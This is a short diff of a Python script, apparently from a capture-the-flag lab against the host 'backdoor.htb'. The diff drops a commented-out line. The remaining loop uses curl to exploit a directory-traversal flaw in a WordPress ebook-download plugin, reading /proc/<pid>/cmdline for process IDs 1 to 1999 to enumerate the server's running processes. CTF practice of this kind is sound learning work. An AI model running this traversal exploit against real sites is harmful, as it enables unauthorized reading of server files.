@@ -14,7 +14,6 @@ proc = 1
 
 while proc < 2000:
 
-    # if proc > 1000:
     os.system("curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/" + str(proc) + "/cmdline > proc_" + str(proc) + ".txt")
 
     proc += 1
